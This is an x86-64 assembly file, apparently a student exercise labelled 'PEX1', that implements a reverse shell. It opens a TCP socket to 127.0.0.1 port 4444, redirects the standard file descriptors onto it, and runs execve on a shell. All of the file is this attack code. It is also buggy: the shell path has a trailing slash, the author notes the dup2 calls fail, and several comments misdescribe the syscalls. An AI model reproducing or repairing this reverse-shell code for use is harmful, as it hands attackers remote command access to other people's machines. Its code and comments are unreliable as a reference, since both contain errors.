;PEX1
;Garret M. Gwozdz
;Documentation: https://gist.github.com/geyslan/5174296 , I used this as a a guideline of what I needed to do. Its in x86 32 so all the syscalls were different in execution but I think they were in the right orde, maybe.

SECTION .data
sh: db "/bin/sh/",0

SECTION .text
    global _start
_start:
    ;a. Create a Stream Socket
    mov rax, 41     ; syscall 41 - socketcall
    mov rdi, 2      ; family: AF_INET 2 
    mov rsi, 1      ; type: SOCK_STREAM 1 stream socket
    mov rdx, 0      ; Protocol: IPPROTO_IP 0
    syscall         ; syscall

    ;check to see if it works
    test rax, rax   ; checks to see if rax is negative
    js end          ; jumps if negative
       
    mov r10, rax    ; saves sockfd

    ;connect to socket
    mov rdi, rax    ; sockfd
    mov rdx, 16     ; length
    mov rax, 42     ; syscall for connect


    ; build a sockaddr_in structure
    push 0x0100007f    ; Address (127.0.0.1)
    push word 0x5C11   ; port in byte reverse order (2 bytes)
    push word 2        ; AF_INET 2
    mov rsi, rsp       ; stores struct address in RSI

    syscall            ; syscall for connect

    ; checks to see if it works
    test rax, rax   ; checks to see if rax is negative  
    js end          ; jumps if negative

    mov r11, rax    ; saves sockfd

    ;duplicating the file descriptors so they can be redirrected to the socket
    ;THIS DOESNT WORK, IT RETURNS -13 EVERY TIME
    mov rax, 33     ; sys_dup2
    mov rsi, 0x00   ; stdin file descriptor

    syscall
  
    mov rax, 33     ;sys_dup2
    mov rsi, 0x01   ;stdout file desciptor
   
    syscall

    mov rax, 33     ;sys_dup2
    mov rsi, 0x02   ;stderr file descriptor
    
    syscall

    ;execute a shell (/bin/sh)
    mov rax, 59     ;syscall

    lea rdi, [sh]    ; pointer to "/bin/sh
    xor rsi, rsi
    xor rdx, rdx

    syscall

end:
    nop
    mov rax, 41     ; syscall 41 - socketcall
    mov rbx, 2      ; socketcall type (sys_shutdown 2)

    mov rdi, rdx    ; socket address
    mov rsi, 2      ; shutdown all

    syscall         ; interupt

    test rax, rax   ; test to make sure it works
    jz end
